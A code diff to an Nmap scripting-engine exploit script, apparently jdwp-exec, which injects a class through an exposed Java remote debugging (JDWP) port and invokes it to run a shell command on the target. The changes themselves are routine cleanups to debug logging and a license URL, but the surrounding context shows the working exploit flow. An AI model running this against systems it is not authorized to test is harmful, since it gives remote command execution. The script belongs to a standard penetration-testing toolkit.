@@ -4,7 +4,6 @@ local jdwp = require "jdwp"
 local stdnse = require "stdnse"
 local nmap = require "nmap"
 local shortport = require "shortport"
-local string = require "string"
 
 description = [[
 Attempts to exploit java's remote debugging port. When remote debugging
@@ -33,7 +32,7 @@ accepts a shell command as its argument.
 -- |_
 
 author = "Aleksandar Nikolic"
-license = "Same as Nmap--See http://nmap.org/book/man-legal.html"
+license = "Same as Nmap--See https://nmap.org/book/man-legal.html"
 categories = {"exploit","intrusive"}
 
 portrule = function(host, port)
@@ -48,7 +47,7 @@ action = function(host, port)
   stdnse.sleep(5) -- let the remote socket recover from connect() scan
   local status,socket = jdwp.connect(host,port) -- initialize the connection
   if not status then
-    stdnse.print_debug("error, %s",socket)
+    stdnse.debug1("error, %s",socket)
     return nil
   end
 
@@ -60,14 +59,14 @@ action = function(host, port)
   local injectedClass
   status,injectedClass = jdwp.injectClass(socket,class_bytes)
   if not status then
-    stdnse.print_debug(1, "%s: Failed to inject class", SCRIPT_NAME)
+    stdnse.debug1("Failed to inject class")
     return stdnse.format_output(false, "Failed to inject class")
   end
   -- find injected class method
   local runMethodID = jdwp.findMethod(socket,injectedClass.id,"run",false)
 
   if runMethodID == nil then
-    stdnse.print_debug(1, "%s: Couldn't find run method", SCRIPT_NAME)
+    stdnse.debug1("Couldn't find run method")
     return stdnse.format_output(false, "Couldn't find run method.")
   end
   -- set run() method argument
@@ -78,7 +77,7 @@ action = function(host, port)
   local cmdID
   status,cmdID = jdwp.createString(socket,0,cmd)
   if not status then
-    stdnse.print_debug(1, "%s: Couldn't create string", SCRIPT_NAME)
+    stdnse.debug1("Couldn't create string")
     return stdnse.format_output(false, cmdID)
   end
   local runArgs = bin.pack(">CL",0x4c,cmdID)  -- 0x4c is object type tag
@@ -86,7 +85,7 @@ action = function(host, port)
   local result
   status, result = jdwp.invokeObjectMethod(socket,0,injectedClass.instance,injectedClass.thread,injectedClass.id,runMethodID,1,runArgs)
   if not status then
-    stdnse.print_debug(1, "%s: Couldn't invoke run method", SCRIPT_NAME)
+    stdnse.debug1("Couldn't invoke run method")
     return stdnse.format_output(false, result)
   end
   -- get the result string
